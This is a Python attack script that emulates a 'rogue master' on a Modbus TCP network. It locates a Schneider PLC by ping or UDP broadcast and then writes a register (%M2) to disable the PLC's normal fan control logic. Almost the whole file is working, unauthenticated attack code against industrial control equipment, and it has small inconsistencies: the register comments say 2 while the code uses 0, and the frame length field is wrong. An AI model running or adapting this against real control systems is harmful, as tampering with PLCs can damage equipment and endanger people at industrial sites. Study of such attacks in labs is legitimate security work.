import socket
import struct
import time
import random

# Configuration parameters
PLC_IP = "192.168.9.24"  # Initial PLC IP Address (Will Attempt to discover if changed)
PLC_PORT = 502  # Standard Modbus port
ROGUE_MASTER_ADDRESS = 2
STARTING_REGISTER = 0 # Replace with the actual address of %M2 in Modbus addressing
NUM_REGISTERS = 1
# Function to check if an IP address is reachable (ping test)
import subprocess

def is_ip_reachable(ip_address):
    """
    Checks if an IP address is reachable by sending ICMP packets (ping).

    Args:
        ip_address (str): The IP address to check.

    Returns:
        bool: True if the IP address is reachable, False otherwise.
    """
    try:
        # Use ping command (platform-specific).  Consider using a cross-platform
        # library like `ping3` for better compatibility if needed.
        # The -n flag specifies the number of pings to send (1 in this case).
        # The -w flag specifies the timeout in milliseconds.
        command = ['ping', '-n', '1', '-w', '1000', ip_address] # Windows
        # command = ['ping', '-c', '1', '-W', '1', ip_address] # Linux/macOS
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()

        # Check the return code.  0 typically means success.
        return process.returncode == 0
    except Exception as e:
        print(f"Error during ping: {e}")
        return False

# Function to discover the PLC's IP address (basic UDP broadcast)
def discover_plc_ip(broadcast_address="192.168.9.255", discover_port=49152):  # Adjusted broadcast address
    """
    Attempts to discover the PLC's IP address by sending a UDP broadcast message.

    Args:
        broadcast_address (str): The broadcast address for the network.
        discover_port (int): The port to send the discovery message to.

    Returns:
        str: The PLC's IP address if discovered, None otherwise.
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        sock.settimeout(2)  # Timeout for response

        message = b"Discover PLC"  # Simple discovery message
        sock.sendto(message, (broadcast_address, discover_port))

        print(f"Discovery message sent to {broadcast_address}:{discover_port}")

        while True:
            try:
                data, addr = sock.recvfrom(1024)
                print(f"Received {len(data)} bytes from {addr}")
                if "PLC Response" in data.decode(): # or some identifiable string
                  print(f"PLC IP address found: {addr[0]}")
                  return addr[0]
            except socket.timeout:
                print("Discovery timeout. No PLC response received.")
                return None
    except Exception as e:
        print(f"Error during IP discovery: {e}")
        return None
    finally:
        sock.close()

def modbus_write_multiple_registers(ip_address, port, slave_address, starting_address, values):
    """
    Writes multiple registers to a Modbus slave device.

    Args:
        ip_address (str): The IP address of the Modbus slave.
        port (int): The port number for Modbus communication.
        slave_address (int): The Modbus slave address.
        starting_address (int): The starting address of the registers to write.
        values (list): A list of integer values to write to the registers.
    """
    try:
        # Create a TCP socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)  # Set a timeout for the connection

        # Connect to the Modbus slave
        sock.connect((ip_address, port))
        print(f"Connected to {ip_address}:{port}")

        # Build the Modbus TCP ADU (Application Data Unit)
        transaction_identifier = random.randint(1, 65535)  # Generate a random transaction ID
        protocol_identifier = 0  # Standard Modbus protocol
        length = 7 + len(values) * 2  # Length of the remaining fields (7 bytes + 2 bytes per register)
        unit_identifier = slave_address  # Modbus slave address
        function_code = 16  # Write Multiple Registers function code (0x10)
        starting_address_bytes = starting_address.to_bytes(2, byteorder='big')
        number_of_registers = len(values).to_bytes(2, byteorder='big')
        byte_count = (len(values) * 2).to_bytes(1, byteorder='big')  # Number of data bytes to follow

        # Pack the data values into bytes
        data_bytes = b''
        for value in values:
            data_bytes += value.to_bytes(2, byteorder='big')

        # Construct the Modbus TCP ADU
        adu = struct.pack(">HHHBBHHB", transaction_identifier, protocol_identifier, length, unit_identifier, function_code, int.from_bytes(starting_address_bytes, byteorder='big'), int.from_bytes(number_of_registers, byteorder='big'), int.from_bytes(byte_count, byteorder='big')) + data_bytes

        # Send the ADU to the Modbus slave
        sock.sendall(adu)
        print(f"Sent Modbus write request (Write Multiple Registers)")

        # Receive the response from the Modbus slave
        response = sock.recv(1024)
        print(f"Received Modbus response: {response.hex()}")  # Print the response in hex format

        # Basic response validation (check function code and exception code)
        if len(response) >= 9:
            response_function_code = response[7]
            if response_function_code == function_code:
                # The function code in the response matches the request
                print("Modbus write successful.")
            else:
                print(f"Modbus write failed. Unexpected function code in response: {response_function_code}")
                #Check for Modbus exception code
                exception_code = response[8]
                print(f"Modbus Exception code: {exception_code}")
        else:
            print("Invalid Modbus response length.")

    except socket.timeout:
        print("Timeout occurred while waiting for a response from the Modbus slave.")
    except ConnectionRefusedError:
        print("Connection refused. Ensure the Modbus server is running on the PLC and the port is open.")
    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        # Close the socket
        sock.close()


def main():
    global PLC_IP # Access the global variable

    # 1. IP Address Discovery (if needed)
    if not is_ip_reachable(PLC_IP):
        print("PLC IP address not reachable. Attempting to discover...")
        discovered_ip = discover_plc_ip()
        if discovered_ip:
            PLC_IP = discovered_ip
            print(f"PLC IP address discovered: {PLC_IP}")
        else:
            print("PLC IP address discovery failed.  Using default IP.  This may not work.")


    # 2. Rogue Master Emulation

    # Simulate the Rogue Master taking over. This is a simplified example.
    print("Emulating Rogue Master...")

    # Example: Toggle M_TOG (%M2) to disable the normal fan control logic

    # M_TOG = 1 (True) to disable the normal fan control.   The Schneider PLC uses
    # Modbus addressing, and %M2 must be translated to the corresponding Modbus register.
    # This is often documented as an offset to a base register for the %M memory area.
    # Assuming %M2 corresponds to Modbus register 2 (adjust this based on your PLC's configuration).
    # We'll write a value to this register.  Since it's a BOOL, we can write 0 for False and 1 for True.

    try:
        # Write the coil/register to disable normal control
        # Assuming %M2 is located at Modbus register 2.  Again, *critical* to verify this.
        modbus_write_multiple_registers(PLC_IP, PLC_PORT, ROGUE_MASTER_ADDRESS, STARTING_REGISTER, [1]) # Write 1 to %M2 (Disable normal fan control)
        print("Successfully wrote to the register to toggle the functionality.")
    except Exception as e:
        print(f"Error writing to the register: {e}")

if __name__ == "__main__":
    main()